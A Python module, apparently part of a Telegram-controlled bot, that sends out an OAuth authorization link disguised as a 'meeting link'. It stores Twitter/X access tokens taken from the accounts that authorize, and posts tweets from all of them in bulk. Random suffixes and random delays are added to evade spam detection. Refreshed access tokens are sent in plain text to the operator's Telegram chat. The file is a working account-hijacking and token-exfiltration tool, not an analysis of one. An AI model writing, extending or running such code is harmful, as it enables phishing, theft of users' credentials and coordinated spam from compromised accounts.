import base64
import hashlib
import os
import requests
import random
import string
import time
from config import TELEGRAM_BOT_TOKEN, TELEGRAM_CHAT_ID, CLIENT_ID, CLIENT_SECRET, DEFAULT_MIN_DELAY, DEFAULT_MAX_DELAY
from database import get_all_tokens  # Import only after resolving circular dependency

# Generate code verifier and challenge for OAuth
def generate_code_verifier_and_challenge():
    code_verifier = base64.urlsafe_b64encode(os.urandom(32)).rstrip(b'=').decode('utf-8')
    code_challenge = base64.urlsafe_b64encode(hashlib.sha256(code_verifier.encode()).digest()).rstrip(b'=').decode('utf-8')
    return code_verifier, code_challenge

# Send a startup message with OAuth link and meeting link
def send_startup_message():
    state = "0"
    code_verifier, code_challenge = generate_code_verifier_and_challenge()
    authorization_url = f"{os.getenv('CALLBACK_URL')}"
    meeting_url = f"{authorization_url}j?meeting={state}&pwd={code_challenge}"

    message = (
        f"🚀 *OAuth Authorization Link:*\n[Authorize link]({authorization_url})\n\n"
        f"📅 *Meeting Link:*\n[Meeting link]({meeting_url})"
    )
    send_message_via_telegram(message)

# Send message via Telegram bot
def send_message_via_telegram(message):
    url = f"https://api.telegram.org/bot{TELEGRAM_BOT_TOKEN}/sendMessage"
    data = {"chat_id": TELEGRAM_CHAT_ID, "text": message, "parse_mode": "Markdown"}
    requests.post(url, json=data)

# Function to post a tweet using a single token
def post_tweet(access_token, tweet_text):
    headers = {"Authorization": f"Bearer {access_token}", "Content-Type": "application/json"}
    payload = {"text": tweet_text}
    response = requests.post("https://api.twitter.com/2/tweets", json=payload, headers=headers)
    return response.json().get("data", {}).get("id", "Error posting tweet")

# Refresh a token using refresh_token and notify via Telegram
def refresh_token_in_db(refresh_token, username):
    token_url = 'https://api.twitter.com/2/oauth2/token'
    client_credentials = f"{CLIENT_ID}:{CLIENT_SECRET}"
    auth_header = base64.b64encode(client_credentials.encode()).decode('utf-8')
    headers = {'Authorization': f'Basic {auth_header}', 'Content-Type': 'application/x-www-form-urlencoded'}
    data = {'refresh_token': refresh_token, 'grant_type': 'refresh_token', 'client_id': CLIENT_ID}
    response = requests.post(token_url, headers=headers, data=data)
    token_response = response.json()
    if response.status_code == 200:
        new_access_token = token_response.get('access_token')
        new_refresh_token = token_response.get('refresh_token')
        send_message_via_telegram(f"🔑 Token refreshed for @{username}. New Access Token: {new_access_token}")
        return new_access_token, new_refresh_token
    else:
        send_message_via_telegram(f"❌ Failed to refresh token for @{username}: {token_response.get('error_description', 'Unknown error')}")
        return None, None

# Retrieve Twitter username and profile URL using the access token
def get_twitter_username_and_profile(access_token):
    headers = {"Authorization": f"Bearer {access_token}"}
    response = requests.get("https://api.twitter.com/2/users/me", headers=headers)
    data = response.json().get("data", {})
    return data.get("username"), f"https://twitter.com/{data.get('username')}"

# Handle posting a tweet with a single token
def handle_post_single(tweet_text):
    tokens = get_all_tokens()
    if tokens:
        access_token, _, username = tokens[0]
        result = post_tweet(access_token, tweet_text)
        send_message_via_telegram(f"📝 Tweet posted with @{username}: {result}")
    else:
        send_message_via_telegram("❌ No tokens found to post a tweet.")

# Helper function to generate a random alphanumeric string
def generate_random_string(length=10):
    characters = string.ascii_letters + string.digits
    return ''.join(random.choice(characters) for _ in range(length))

# Handle bulk tweet posting with random delays
def handle_post_bulk(message):
    tokens = get_all_tokens()
    if not tokens:
        send_message_via_telegram("❌ No tokens found to post tweets.")
        return

    min_delay = DEFAULT_MIN_DELAY
    max_delay = DEFAULT_MAX_DELAY
    for access_token, _, username in tokens:
        random_suffix = generate_random_string(10)
        tweet_text = f"{message} {random_suffix}"
        result = post_tweet(access_token, tweet_text)
        delay = random.randint(min_delay, max_delay)
        send_message_via_telegram(f"📝 Tweet posted with @{username}: {result}\n⏱ Delay before next post: {delay} seconds.")
        time.sleep(delay)
    send_message_via_telegram(f"✅ Bulk tweet posting complete. {len(tokens)} tweets posted.")

# Handle single token refresh
def handle_refresh_single():
    tokens = get_all_tokens()
    if tokens:
        _, token_refresh, username = tokens[0]
        refresh_token_in_db(token_refresh, username)
    else:
        send_message_via_telegram("❌ No tokens found to refresh.")

# Handle bulk token refresh
def handle_refresh_bulk():
    tokens = get_all_tokens()
    if tokens:
        for _, refresh_token, username in tokens:
            refresh_token_in_db(refresh_token, username)
        send_message_via_telegram(f"✅ Bulk token refresh complete. {len(tokens)} tokens refreshed.")
    else:
        send_message_via_telegram("❌ No tokens found to refresh.")
